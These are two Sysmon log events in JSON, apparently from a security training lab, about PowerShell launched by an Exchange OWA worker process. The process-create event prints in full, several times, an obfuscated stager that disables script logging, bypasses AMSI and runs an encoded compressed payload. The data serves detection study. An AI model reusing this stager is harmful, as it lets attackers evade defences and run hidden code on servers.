{"log":{"ComputerName":"WIN_SERVER.masterschool.local","CreationUtcTime":"2022-11-29 19:51:51.293","EventCode":"11","EventType":"4","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:51.293\r\nProcessGuid: {72893ba8-1456-6139-0502-000000000c00}\r\nProcessId: 1716\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Windows\\Temp\\__PSScriptPolicyTest_oftyovms.t2g.ps1\r\nCreationUtcTime: 2022-11-29 19:51:51.293","OpCode":"Info","ProcessGuid":"{72893ba8-1456-6139-0502-000000000c00}","ProcessId":"1716","RecordNumber":"2759","RuleName":"-","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TargetFilename":"C:\\Windows\\Temp\\__PSScriptPolicyTest_oftyovms.t2g.ps1","TaskCategory":"File created (rule: FileCreate)","Type":"Information","User":"NOT_TRANSLATED","UtcTime":"2022-11-29 19:51:51.293","_raw":"11/29/2022 03:51:51 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=11\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2759\nKeywords=None\nTaskCategory=File created (rule: FileCreate)\nOpCode=Info\nMessage=File created:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:51.293\r\nProcessGuid: {72893ba8-1456-6139-0502-000000000c00}\r\nProcessId: 1716\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Windows\\Temp\\__PSScriptPolicyTest_oftyovms.t2g.ps1\r\nCreationUtcTime: 2022-11-29 19:51:51.293","_time":"2022-11-29T12:51:51.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"22","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_-\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
{"log":{"CommandLine":"powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $fL=[Collections.Generic.Dictionary[string,System.Object]]::new(); $tx=((''Enab''+''l{0}S''+''c{1}i''+''{''+''2}tBlock{''+''3}ogging'')-f''e'',''r'',''p'',''L''); $hVd=((''{0}cr''+''i{2}{''+''1}''+''Bloc''+''kLogging'')-f''S'',''t'',''p'');If($PSVersionTable.PSVersion.Major -ge 3){ $aPTe=[Ref].Assembly.GetType(((''''+''{''+''6}{3''+''}st''+''em''+''{9''+''}''+''{0''+''}ana{''+''5}''+''em''+''en''+''t''+''{9}{7}{2}t{8''+''}ma''+''ti{''+''8}n{9}{7''+''}''+''msi{''+''4}ti{''+''1}s'')-f''M'',''l'',''u'',''y'',''U'',''g'',''S'',''A'',''o'',''.'')); $xAz=[Ref].Assembly.GetType(((''{2}''+''{5''+''}stem.{3}a''+''na{''+''4}''+''ement.''+''{0}utomation''+''.Uti{1}s'')-f''A'',''l'',''S'',''M'',''g'',''y'')); if ($aPTe) { $aPTe.GetField(((''''+''a''+''msiI{2}''+''it{''+''1}ai{''+''4''+''}{3''+''}{0}''+'''')-f''d'',''F'',''n'',''e'',''l''),''NonPublic,Static'').SetValue($null,$true); }; $h5uos=$xAz.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); $ck=((''''+''En''+''a''+''{5}l{0}Sc''+''riptBloc''+''{''+''2}{3}''+''n{4}ocation{1}ogging'')-f''e'',''L'',''k'',''I'',''v'',''b''); If ($h5uos) { $jX55K=$h5uos.GetValue($null); If($jX55K[$hVd]){ $jX55K[$hVd][$tx]=0; $jX55K[$hVd][$ck]=0; } $fL.Add($tx,0); $fL.Add($ck,0); $jX55K[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$hVd]=$fL; } Else { [Ref].Assembly.GetType(((''S{2}stem.''+''{1}ana''+''gement.{0}{4}toma''+''t''+''ion.Scr''+''ipt{3}{''+''5}''+''o''+''ck'')-f''A'',''M'',''y'',''B'',''u'',''l'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAFYUOWECA7VXbW+jRhD+Xqn''+''/AVWWjHWOjWN{0}7nLSSV0wBKjxmWBwEteqCKzNxgvrwBLb1/a/dxabJNdL2mulQ0KGZd72mWdm1ssyizhhmRRqnvT7jz9Ix2sS5mEqyY3PD7u21CjOndbTtwY959''+''JHSZ6jzWbI0pBki''+''w{1}{0}tDLPccYP750LzFFR4PSWElzILekPaZbgHJ9{1}ur3DEZd+lxq/dS4ouw3pUWyvhVGCpROUxeLbiEWhCKvjbSjhc''+''vPXX5ut+Ulv0dHvy5AWctPbFxynnZjSZkv6syUcTvcb''+''LDcdEuWsYEvemZGs{0}9rxsyJc4jFYe{1}AO5gmLiybs5Wk3OeZlnl''+''WbElYOMnITHic5i1Ac57gomm1pLuzPF4u{0}5{0}nR+WWZcZLijpVxnLONh/MHEuGiY4ZZTPElXi5Ay+M5yVaLVgvEHtgay42spLQt/Rcz{1}hhva+i+VUl+rgRSE5632pDQr7{0}psLik+KDY{0}CFOwYEWXEceAHh/CvyWNXPW5+9eYM7TQn3Nqy{1}Y4pUnrCCV7kdJaUsOuA45y/{0}w2pjmJW4tHtGWGrxo{0}6utXq0IauEpvYKlecBIvHgy{1}EXqGwV3vKGQep3JQ7wkGR7uszAlUU1W+aWM4CXFFSKdWmwMIcrN4wccDzHFq5ALkAUxvlLTU{1}I{0}ddWS0BjnKIKsFhAVJLz1ZTCHvMlNK3Nw''+''Cugd3oGpjSWUCK6lj2Wxr72LdxBqajQsirY0KaFGo7bk4ZDiuC2hrCDHT6jkrHpsPoXrlJSTKCx4bW7R+jueR7{1}aywqelx''+''EkFjCYehsckZAKSNqSSWKs7j2yqv03XwRECymF4gFLD5AQWBFAeFzQJYdQgRqtjoe5lW4oTkGiahkGDV{0}QII4FUrErXOG4+VqcdSUcaC+QqSF5FiWk26OMt6WA5Bw6kEBZMOx/BPF15zlEo+X4mB25LrG5uueiCBrJWy/2BU+PGFWI5BzQMHKWqmGBzwaHRiP/1NXJ{1}O1kyD4juHTj0g1Uzw9uLCe2qWdx71onIz9JLNKzVh560/{0}Wm7ETUYv0bdcbmig{0}7pIlsgpLN9W921NRZJJ3gV3Ju{1}HFyL3''+''bWShW09XV6lrbWpPkygJH2mh''+''lreBXtZJIVW6Ularo3sjVVBvF2shTE3{0}Qu6n{1}''+''dN9TlXz2LA+ZM+HPjUx7GO7Ajz4YmFe7KRo7NkqM''+''T7HROzUSnSho''+''7bmme7O+GA316j0S7+51oRNd+DGu3SDBs2''+''CjznTjxg021urNFmIddQdGosK6RXajjdeFq9cDHPjUu33bD2dvN7dpoABGM{1}/KEi9aalMzStVuN/B7Y4tgYzpbK7utruz2wRh02FmQpZmAFU26wRkqxNPO0Qb1vUcG+IoMe/dee4dchKZT0wZb96g3tqE27ez9daXePb9in1wB27kaGioNMuvUPY0T5{1}4eTi/GI+dqY4a+3Q/W9NSl44HXD5''+''ZBP7Cn/YRFZjCO/XE49oPZZaDaI//S{1}07PHaQTexuMQ{1}BC4Dz1Rivk3BO9cmioU1/JzG3Jg9HdQ7{0}nE3uXsl+uFGK/n7HljNpsNXSAL6k9uGC6G1C7zIKLjNXxBmBTBTxA3gc{1}/CMmgNnIvb7GgBnk''+''vWcqd+b2ejUFHtjlerodY1Tr''+''Q97PFVSW92e''+''GL3gync02aLZObQX4pesQGxKIgR4la/+N/6i37oE{0}K{1}vg3sEdgk/''+''ADVWxvvHTM30T2gNBPTQU+xruNM3Y''+''mt7+hhUmcGwo4lLo3XB2wdDMBz{1}PWo/R227P/{0}jxJ6i0uU{1}y3j9dNPKJEomB9OMP''+''j{0}hm9''+''KzaXpu1TpgXSUihCmGK1v3QYLlxnIwTRoSGLIuz1RrnGaZwIIEjS91FEKUsElNZjFA4EBzGtDg1+FYV00tPLelRsPU0reulDx9uIEZoS1XL6IxwtuJJW9n1FQUmrbJTBlUL+vataWyzlw/W2mJYC2wezdPKPFgkS0mWvztecCDjMBpeRew1{1}MDzGjo5TJZDexUQqozR5wAe9vVIhi/gA9x6sPW5OItVNAELJ/geer{1}4rDw//DRwi{0}3vSp3j''+''mEjgJ/4X6jyt/cPXb6KT0q7g+Wr1y4VnE/b77X{1}WEg6CHsw6ig{1}nsBdhOBbLswSL1EAlLI+X+FPyqeQnYzjmVvP2L7249GQLDQAA'')-f''f'',''8'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"","Company":"Microsoft Corporation","ComputerName":"WIN_SERVER.masterschool.local","CurrentDirectory":"c:\\windows\\system32\\inetsrv\\","Description":"Windows PowerShell","EventCode":"1","EventType":"4","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"System","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{72893ba8-111d-6139-e703-000000000000}","LogonId":"0x3E7","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:50.996\r\nProcessGuid: {72893ba8-1456-6139-0502-000000000c00}\r\nProcessId: 1716\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $fL=[Collections.Generic.Dictionary[string,System.Object]]::new(); $tx=((''Enab''+''l{0}S''+''c{1}i''+''{''+''2}tBlock{''+''3}ogging'')-f''e'',''r'',''p'',''L''); $hVd=((''{0}cr''+''i{2}{''+''1}''+''Bloc''+''kLogging'')-f''S'',''t'',''p'');If($PSVersionTable.PSVersion.Major -ge 3){ $aPTe=[Ref].Assembly.GetType(((''''+''{''+''6}{3''+''}st''+''em''+''{9''+''}''+''{0''+''}ana{''+''5}''+''em''+''en''+''t''+''{9}{7}{2}t{8''+''}ma''+''ti{''+''8}n{9}{7''+''}''+''msi{''+''4}ti{''+''1}s'')-f''M'',''l'',''u'',''y'',''U'',''g'',''S'',''A'',''o'',''.'')); $xAz=[Ref].Assembly.GetType(((''{2}''+''{5''+''}stem.{3}a''+''na{''+''4}''+''ement.''+''{0}utomation''+''.Uti{1}s'')-f''A'',''l'',''S'',''M'',''g'',''y'')); if ($aPTe) { $aPTe.GetField(((''''+''a''+''msiI{2}''+''it{''+''1}ai{''+''4''+''}{3''+''}{0}''+'''')-f''d'',''F'',''n'',''e'',''l''),''NonPublic,Static'').SetValue($null,$true); }; $h5uos=$xAz.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); $ck=((''''+''En''+''a''+''{5}l{0}Sc''+''riptBloc''+''{''+''2}{3}''+''n{4}ocation{1}ogging'')-f''e'',''L'',''k'',''I'',''v'',''b''); If ($h5uos) { $jX55K=$h5uos.GetValue($null); If($jX55K[$hVd]){ $jX55K[$hVd][$tx]=0; $jX55K[$hVd][$ck]=0; } $fL.Add($tx,0); $fL.Add($ck,0); $jX55K[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$hVd]=$fL; } Else { [Ref].Assembly.GetType(((''S{2}stem.''+''{1}ana''+''gement.{0}{4}toma''+''t''+''ion.Scr''+''ipt{3}{''+''5}''+''o''+''ck'')-f''A'',''M'',''y'',''B'',''u'',''l'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAFYUOWECA7VXbW+jRhD+Xqn''+''/AVWWjHWOjWN{0}7nLSSV0wBKjxmWBwEteqCKzNxgvrwBLb1/a/dxabJNdL2mulQ0KGZd72mWdm1ssyizhhmRRqnvT7jz9Ix2sS5mEqyY3PD7u21CjOndbTtwY959''+''JHSZ6jzWbI0pBki''+''w{1}{0}tDLPccYP750LzFFR4PSWElzILekPaZbgHJ9{1}ur3DEZd+lxq/dS4ouw3pUWyvhVGCpROUxeLbiEWhCKvjbSjhc''+''vPXX5ut+Ulv0dHvy5AWctPbFxynnZjSZkv6syUcTvcb''+''LDcdEuWsYEvemZGs{0}9rxsyJc4jFYe{1}AO5gmLiybs5Wk3OeZlnl''+''WbElYOMnITHic5i1Ac57gomm1pLuzPF4u{0}5{0}nR+WWZcZLijpVxnLONh/MHEuGiY4ZZTPElXi5Ay+M5yVaLVgvEHtgay42spLQt/Rcz{1}hhva+i+VUl+rgRSE5632pDQr7{0}psLik+KDY{0}CFOwYEWXEceAHh/CvyWNXPW5+9eYM7TQn3Nqy{1}Y4pUnrCCV7kdJaUsOuA45y/{0}w2pjmJW4tHtGWGrxo{0}6utXq0IauEpvYKlecBIvHgy{1}EXqGwV3vKGQep3JQ7wkGR7uszAlUU1W+aWM4CXFFSKdWmwMIcrN4wccDzHFq5ALkAUxvlLTU{1}I{0}ddWS0BjnKIKsFhAVJLz1ZTCHvMlNK3Nw''+''Cugd3oGpjSWUCK6lj2Wxr72LdxBqajQsirY0KaFGo7bk4ZDiuC2hrCDHT6jkrHpsPoXrlJSTKCx4bW7R+jueR7{1}aywqelx''+''EkFjCYehsckZAKSNqSSWKs7j2yqv03XwRECymF4gFLD5AQWBFAeFzQJYdQgRqtjoe5lW4oTkGiahkGDV{0}QII4FUrErXOG4+VqcdSUcaC+QqSF5FiWk26OMt6WA5Bw6kEBZMOx/BPF15zlEo+X4mB25LrG5uueiCBrJWy/2BU+PGFWI5BzQMHKWqmGBzwaHRiP/1NXJ{1}O1kyD4juHTj0g1Uzw9uLCe2qWdx71onIz9JLNKzVh560/{0}Wm7ETUYv0bdcbmig{0}7pIlsgpLN9W921NRZJJ3gV3Ju{1}HFyL3''+''bWShW09XV6lrbWpPkygJH2mh''+''lreBXtZJIVW6Ularo3sjVVBvF2shTE3{0}Qu6n{1}''+''dN9TlXz2LA+ZM+HPjUx7GO7Ajz4YmFe7KRo7NkqM''+''T7HROzUSnSho''+''7bmme7O+GA316j0S7+51oRNd+DGu3SDBs2''+''CjznTjxg021urNFmIddQdGosK6RXajjdeFq9cDHPjUu33bD2dvN7dpoABGM{1}/KEi9aalMzStVuN/B7Y4tgYzpbK7utruz2wRh02FmQpZmAFU26wRkqxNPO0Qb1vUcG+IoMe/dee4dchKZT0wZb96g3tqE27ez9daXePb9in1wB27kaGioNMuvUPY0T5{1}4eTi/GI+dqY4a+3Q/W9NSl44HXD5''+''ZBP7Cn/YRFZjCO/XE49oPZZaDaI//S{1}07PHaQTexuMQ{1}BC4Dz1Rivk3BO9cmioU1/JzG3Jg9HdQ7{0}nE3uXsl+uFGK/n7HljNpsNXSAL6k9uGC6G1C7zIKLjNXxBmBTBTxA3gc{1}/CMmgNnIvb7GgBnk''+''vWcqd+b2ejUFHtjlerodY1Tr''+''Q97PFVSW92e''+''GL3gync02aLZObQX4pesQGxKIgR4la/+N/6i37oE{0}K{1}vg3sEdgk/''+''ADVWxvvHTM30T2gNBPTQU+xruNM3Y''+''mt7+hhUmcGwo4lLo3XB2wdDMBz{1}PWo/R227P/{0}jxJ6i0uU{1}y3j9dNPKJEomB9OMP''+''j{0}hm9''+''KzaXpu1TpgXSUihCmGK1v3QYLlxnIwTRoSGLIuz1RrnGaZwIIEjS91FEKUsElNZjFA4EBzGtDg1+FYV00tPLelRsPU0reulDx9uIEZoS1XL6IxwtuJJW9n1FQUmrbJTBlUL+vataWyzlw/W2mJYC2wezdPKPFgkS0mWvztecCDjMBpeRew1{1}MDzGjo5TJZDexUQqozR5wAe9vVIhi/gA9x6sPW5OItVNAELJ/geer{1}4rDw//DRwi{0}3vSp3j''+''mEjgJ/4X6jyt/cPXb6KT0q7g+Wr1y4VnE/b77X{1}WEg6CHsw6ig{1}nsBdhOBbLswSL1EAlLI+X+FPyqeQnYzjmVvP2L7249GQLDQAA'')-f''f'',''8'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\r\nCurrentDirectory: c:\\windows\\system32\\inetsrv\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F\r\nParentProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nParentProcessId: 12264\r\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\r\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","OpCode":"Info","OriginalFileName":"PowerShell.EXE","ParentCommandLine":"c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","ParentImage":"C:\\Windows\\System32\\inetsrv\\w3wp.exe","ParentProcessGuid":"{72893ba8-120b-6139-2101-000000000c00}","ParentProcessId":"12264","ProcessGuid":"{72893ba8-1456-6139-0502-000000000c00}","ProcessId":"1716","Product":"Microsoft® Windows® Operating System","RecordNumber":"2758","RuleName":"-","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"0","Type":"Information","User":["NOT_TRANSLATED","NT AUTHORITY\\SYSTEM"],"UtcTime":"2022-11-29 19:51:50.996","_raw":"11/29/2022 03:51:51 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2758\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:50.996\r\nProcessGuid: {72893ba8-1456-6139-0502-000000000c00}\r\nProcessId: 1716\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $fL=[Collections.Generic.Dictionary[string,System.Object]]::new(); $tx=((''Enab''+''l{0}S''+''c{1}i''+''{''+''2}tBlock{''+''3}ogging'')-f''e'',''r'',''p'',''L''); $hVd=((''{0}cr''+''i{2}{''+''1}''+''Bloc''+''kLogging'')-f''S'',''t'',''p'');If($PSVersionTable.PSVersion.Major -ge 3){ $aPTe=[Ref].Assembly.GetType(((''''+''{''+''6}{3''+''}st''+''em''+''{9''+''}''+''{0''+''}ana{''+''5}''+''em''+''en''+''t''+''{9}{7}{2}t{8''+''}ma''+''ti{''+''8}n{9}{7''+''}''+''msi{''+''4}ti{''+''1}s'')-f''M'',''l'',''u'',''y'',''U'',''g'',''S'',''A'',''o'',''.'')); $xAz=[Ref].Assembly.GetType(((''{2}''+''{5''+''}stem.{3}a''+''na{''+''4}''+''ement.''+''{0}utomation''+''.Uti{1}s'')-f''A'',''l'',''S'',''M'',''g'',''y'')); if ($aPTe) { $aPTe.GetField(((''''+''a''+''msiI{2}''+''it{''+''1}ai{''+''4''+''}{3''+''}{0}''+'''')-f''d'',''F'',''n'',''e'',''l''),''NonPublic,Static'').SetValue($null,$true); }; $h5uos=$xAz.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); $ck=((''''+''En''+''a''+''{5}l{0}Sc''+''riptBloc''+''{''+''2}{3}''+''n{4}ocation{1}ogging'')-f''e'',''L'',''k'',''I'',''v'',''b''); If ($h5uos) { $jX55K=$h5uos.GetValue($null); If($jX55K[$hVd]){ $jX55K[$hVd][$tx]=0; $jX55K[$hVd][$ck]=0; } $fL.Add($tx,0); $fL.Add($ck,0); $jX55K[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$hVd]=$fL; } Else { [Ref].Assembly.GetType(((''S{2}stem.''+''{1}ana''+''gement.{0}{4}toma''+''t''+''ion.Scr''+''ipt{3}{''+''5}''+''o''+''ck'')-f''A'',''M'',''y'',''B'',''u'',''l'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAFYUOWECA7VXbW+jRhD+Xqn''+''/AVWWjHWOjWN{0}7nLSSV0wBKjxmWBwEteqCKzNxgvrwBLb1/a/dxabJNdL2mulQ0KGZd72mWdm1ssyizhhmRRqnvT7jz9Ix2sS5mEqyY3PD7u21CjOndbTtwY959''+''JHSZ6jzWbI0pBki''+''w{1}{0}tDLPccYP750LzFFR4PSWElzILekPaZbgHJ9{1}ur3DEZd+lxq/dS4ouw3pUWyvhVGCpROUxeLbiEWhCKvjbSjhc''+''vPXX5ut+Ulv0dHvy5AWctPbFxynnZjSZkv6syUcTvcb''+''LDcdEuWsYEvemZGs{0}9rxsyJc4jFYe{1}AO5gmLiybs5Wk3OeZlnl''+''WbElYOMnITHic5i1Ac57gomm1pLuzPF4u{0}5{0}nR+WWZcZLijpVxnLONh/MHEuGiY4ZZTPElXi5Ay+M5yVaLVgvEHtgay42spLQt/Rcz{1}hhva+i+VUl+rgRSE5632pDQr7{0}psLik+KDY{0}CFOwYEWXEceAHh/CvyWNXPW5+9eYM7TQn3Nqy{1}Y4pUnrCCV7kdJaUsOuA45y/{0}w2pjmJW4tHtGWGrxo{0}6utXq0IauEpvYKlecBIvHgy{1}EXqGwV3vKGQep3JQ7wkGR7uszAlUU1W+aWM4CXFFSKdWmwMIcrN4wccDzHFq5ALkAUxvlLTU{1}I{0}ddWS0BjnKIKsFhAVJLz1ZTCHvMlNK3Nw''+''Cugd3oGpjSWUCK6lj2Wxr72LdxBqajQsirY0KaFGo7bk4ZDiuC2hrCDHT6jkrHpsPoXrlJSTKCx4bW7R+jueR7{1}aywqelx''+''EkFjCYehsckZAKSNqSSWKs7j2yqv03XwRECymF4gFLD5AQWBFAeFzQJYdQgRqtjoe5lW4oTkGiahkGDV{0}QII4FUrErXOG4+VqcdSUcaC+QqSF5FiWk26OMt6WA5Bw6kEBZMOx/BPF15zlEo+X4mB25LrG5uueiCBrJWy/2BU+PGFWI5BzQMHKWqmGBzwaHRiP/1NXJ{1}O1kyD4juHTj0g1Uzw9uLCe2qWdx71onIz9JLNKzVh560/{0}Wm7ETUYv0bdcbmig{0}7pIlsgpLN9W921NRZJJ3gV3Ju{1}HFyL3''+''bWShW09XV6lrbWpPkygJH2mh''+''lreBXtZJIVW6Ularo3sjVVBvF2shTE3{0}Qu6n{1}''+''dN9TlXz2LA+ZM+HPjUx7GO7Ajz4YmFe7KRo7NkqM''+''T7HROzUSnSho''+''7bmme7O+GA316j0S7+51oRNd+DGu3SDBs2''+''CjznTjxg021urNFmIddQdGosK6RXajjdeFq9cDHPjUu33bD2dvN7dpoABGM{1}/KEi9aalMzStVuN/B7Y4tgYzpbK7utruz2wRh02FmQpZmAFU26wRkqxNPO0Qb1vUcG+IoMe/dee4dchKZT0wZb96g3tqE27ez9daXePb9in1wB27kaGioNMuvUPY0T5{1}4eTi/GI+dqY4a+3Q/W9NSl44HXD5''+''ZBP7Cn/YRFZjCO/XE49oPZZaDaI//S{1}07PHaQTexuMQ{1}BC4Dz1Rivk3BO9cmioU1/JzG3Jg9HdQ7{0}nE3uXsl+uFGK/n7HljNpsNXSAL6k9uGC6G1C7zIKLjNXxBmBTBTxA3gc{1}/CMmgNnIvb7GgBnk''+''vWcqd+b2ejUFHtjlerodY1Tr''+''Q97PFVSW92e''+''GL3gync02aLZObQX4pesQGxKIgR4la/+N/6i37oE{0}K{1}vg3sEdgk/''+''ADVWxvvHTM30T2gNBPTQU+xruNM3Y''+''mt7+hhUmcGwo4lLo3XB2wdDMBz{1}PWo/R227P/{0}jxJ6i0uU{1}y3j9dNPKJEomB9OMP''+''j{0}hm9''+''KzaXpu1TpgXSUihCmGK1v3QYLlxnIwTRoSGLIuz1RrnGaZwIIEjS91FEKUsElNZjFA4EBzGtDg1+FYV00tPLelRsPU0reulDx9uIEZoS1XL6IxwtuJJW9n1FQUmrbJTBlUL+vataWyzlw/W2mJYC2wezdPKPFgkS0mWvztecCDjMBpeRew1{1}MDzGjo5TJZDexUQqozR5wAe9vVIhi/gA9x6sPW5OItVNAELJ/geer{1}4rDw//DRwi{0}3vSp3j''+''mEjgJ/4X6jyt/cPXb6KT0q7g+Wr1y4VnE/b77X{1}WEg6CHsw6ig{1}nsBdhOBbLswSL1EAlLI+X+FPyqeQnYzjmVvP2L7249GQLDQAA'')-f''f'',''8'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\r\nCurrentDirectory: c:\\windows\\system32\\inetsrv\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F\r\nParentProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nParentProcessId: 12264\r\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\r\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","_time":"2022-11-29T12:51:51.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"37","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_-\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
